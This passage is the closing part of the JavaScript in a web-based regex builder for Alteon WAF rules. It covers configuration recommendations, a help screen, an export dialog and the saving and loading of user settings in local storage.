            }
            
            if (!selectedAttacks.has('utf8unicode') && selectedAttacks.size > 0) {
                recommendations.push("Consider adding UTF-8/Unicode parsing protection to prevent encoding bypasses");
            }
            
            if (!selectedAttacks.has('httpheaders') && selectedAttacks.size > 0) {
                recommendations.push("Consider adding HTTP header protection to prevent header injection attacks");
            }
            
            if (currentRegex.length > 1000) {
                recommendations.push("Regex pattern is very long - consider optimization or splitting into multiple rules");
            }
            
            if (selectedAttacks.has('fileupload') && !selectedAttacks.has('lfi')) {
                recommendations.push("File upload protection works best with Local File Inclusion (LFI) protection enabled");
            }
            
            if (difficultyLevel === 'basic' && selectedAttacks.size > 5) {
                recommendations.push("Consider switching to Advanced or Expert mode for more comprehensive pattern options");
            }
            
            return recommendations;
        }

        function showHelp() {
            const helpText = `Alteon WAF Regex Builder Pro - Advanced Edition

GETTING STARTED:
1. Choose a difficulty level (Basic/Advanced/Expert)
2. Select attack types you want to protect against
3. Choose specific patterns from each category
4. Test your regex with sample payloads
5. Export configuration for your Alteon WAF

QUICK PRESETS:
• Basic Web Protection: Essential patterns for common attacks
• API Security: JSON, NoSQL, and API-specific protections
• High Security: Comprehensive protection against critical vulnerabilities
• OWASP Top 10: Patterns targeting OWASP Top 10 vulnerabilities
• File Upload Protection: Secure file handling and directory access
• JSON/REST API: Specialized protection for modern APIs

NEW FEATURES:
• UTF-8/Unicode Parsing: Detect encoding-based bypass attempts
• JSON Parsing: Protect against JSON injection and parsing attacks
• HTTP Headers: Prevent header injection and request smuggling
• URI Parameters: Detect parameter pollution and manipulation
• URI Encoding: Identify multiple encoding and obfuscation attempts
• File Upload Protection: Comprehensive file upload security
• Directory Discovery: Prevent enumeration and forced browsing

TIPS:
• Start with a preset for quick configuration
• Use Basic mode for essential protection
• Switch to Advanced/Expert for comprehensive coverage
• Test patterns with real-world payloads
• Monitor regex length for performance
• Export in multiple formats for flexibility

For detailed documentation, visit the Radware support portal.`;
            
            alert(helpText);
        }

        function exportConfig() {
            updateExport();
            const modal = document.createElement('div');
            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
            modal.innerHTML = `
                <div class="bg-white rounded-lg p-6 max-w-2xl w-full mx-4 max-h-[90vh] overflow-y-auto">
                    <h3 class="text-lg font-bold mb-4">Export Configuration</h3>
                    <div class="space-y-4">
                        <div>
                            <label class="block text-sm font-medium mb-1">Format:</label>
                            <select id="modalExportFormat" class="w-full p-2 border rounded">
                                <option value="alteon" ${exportFormat === 'alteon' ? 'selected' : ''}>Alteon CLI</option>
                                <option value="appwall" ${exportFormat === 'appwall' ? 'selected' : ''}>AppWall XML</option>
                                <option value="json" ${exportFormat === 'json' ? 'selected' : ''}>JSON</option>
                            </select>
                        </div>
                        <div>
                            <label class="block text-sm font-medium mb-1">Configuration Preview:</label>
                            <textarea id="modalExportContent" class="w-full h-96 p-2 border rounded mono text-sm" readonly></textarea>
                        </div>
                        <div class="grid grid-cols-2 gap-3">
                            <div>
                                <h4 class="text-sm font-medium mb-2">Summary:</h4>
                                <div class="text-xs space-y-1 bg-gray-50 p-3 rounded">
                                    <div>Attack Types: ${selectedAttacks.size}</div>
                                    <div>Total Patterns: ${selectedPatterns.size}</div>
                                    <div>Regex Length: ${currentRegex.length} characters</div>
                                    <div>Difficulty: ${difficultyLevel}</div>
                                </div>
                            </div>
                            <div>
                                <h4 class="text-sm font-medium mb-2">Selected Attacks:</h4>
                                <div class="text-xs space-y-1 bg-gray-50 p-3 rounded max-h-24 overflow-y-auto">
                                    ${Array.from(selectedAttacks).map(key => attackPatterns[key].name).join(', ')}
                                </div>
                            </div>
                        </div>
                        <div class="flex gap-3">
                            <button onclick="copyModalExport()" class="btn btn-primary flex-1">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                            <button onclick="downloadModalExport()" class="btn btn-secondary flex-1">
                                <i class="fas fa-download"></i> Download
                            </button>
                            <button onclick="closeModal()" class="btn btn-secondary">
                                <i class="fas fa-times"></i> Close
                            </button>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.appendChild(modal);
            document.getElementById('modalExportContent').value = document.getElementById('exportOutput').textContent;
            
            document.getElementById('modalExportFormat').onchange = function() {
                selectExportFormat(this.value);
                document.getElementById('modalExportContent').value = document.getElementById('exportOutput').textContent;
            };
            
            window.closeModal = () => document.body.removeChild(modal);
            window.copyModalExport = () => {
                navigator.clipboard.writeText(document.getElementById('modalExportContent').value).then(() => {
                    const btn = event.currentTarget;
                    const original = btn.innerHTML;
                    btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                    btn.classList.add('bg-green-600');
                    setTimeout(() => {
                        btn.innerHTML = original;
                        btn.classList.remove('bg-green-600');
                    }, 2000);
                });
            };
            window.downloadModalExport = downloadExport;
        }

        // State management
        function saveState() {
            const state = {
                selectedAttacks: Array.from(selectedAttacks),
                selectedPatterns: Array.from(selectedPatterns),
                exportFormat: exportFormat,
                difficultyLevel: difficultyLevel,
                options: {
                    caseInsensitive: document.getElementById('caseInsensitive')?.checked || false,
                    multiline: document.getElementById('multiline')?.checked || false,
                    wordBoundaries: document.getElementById('wordBoundaries')?.checked || false
                },
                ruleName: document.getElementById('ruleName')?.value || '',
                ruleDescription: document.getElementById('ruleDescription')?.value || '',
                ruleSeverity: document.getElementById('ruleSeverity')?.value || 'high',
                ruleAction: document.getElementById('ruleAction')?.value || 'block'
            };
            localStorage.setItem('alteonWafBuilderAdvanced', JSON.stringify(state));
        }

        function loadState() {
            try {
                const saved = localStorage.getItem('alteonWafBuilderAdvanced');
                if (saved) {
                    const state = JSON.parse(saved);
                    
                    // Restore difficulty level
                    if (state.difficultyLevel) {
                        setDifficulty(state.difficultyLevel);
                    }
                    
                    // Restore attack selections
                    state.selectedAttacks?.forEach(attackKey => {
                        if (attackPatterns[attackKey]) {
                            toggleAttack(attackKey);
                        }
                    });
                    
                    // Restore pattern selections
                    setTimeout(() => {
                        state.selectedPatterns?.forEach(pattern => {
                            selectedPatterns.add(pattern);
                        });
                        
                        // Update UI
                        document.querySelectorAll('.pattern-chip').forEach(chip => {
                            const patternOnclick = chip.getAttribute('onclick');
                            if (patternOnclick) {
                                const match = patternOnclick.match(/togglePattern\('([^']+)'/);
                                if (match) {
                                    const pattern = match[1].replace(/&#39;/g, "'").replace(/&quot;/g, '"');
                                    if (selectedPatterns.has(pattern)) {
                                        chip.classList.add('active');
                                    }
                                }
                            }
                        });
                        
                        // Restore options
                        if (state.options) {
                            if (document.getElementById('caseInsensitive')) {
                                document.getElementById('caseInsensitive').checked = state.options.caseInsensitive;
                            }
                            if (document.getElementById('multiline')) {
                                document.getElementById('multiline').checked = state.options.multiline;
                            }
                            if (document.getElementById('wordBoundaries')) {
                                document.getElementById('wordBoundaries').checked = state.options.wordBoundaries;
                            }
                        }
                        
                        // Restore form fields
                        if (state.ruleName && document.getElementById('ruleName')) {
                            document.getElementById('ruleName').value = state.ruleName;
                        }
                        if (state.ruleDescription && document.getElementById('ruleDescription')) {
                            document.getElementById('ruleDescription').value = state.ruleDescription;
                        }
                        if (state.ruleSeverity && document.getElementById('ruleSeverity')) {
                            document.getElementById('ruleSeverity').value = state.ruleSeverity;
                        }
                        if (state.ruleAction && document.getElementById('ruleAction')) {
                            document.getElementById('ruleAction').value = state.ruleAction;
                        }
                        
                        updateRegex();
                        updateStats();
                    }, 500);
                    
                    // Restore export format
                    if (state.exportFormat) {
                        selectExportFormat(state.exportFormat);
                    }
                }
            } catch (error) {
                console.warn('Failed to load saved state:', error);
            }
        }
    </script>
</body>
</html>
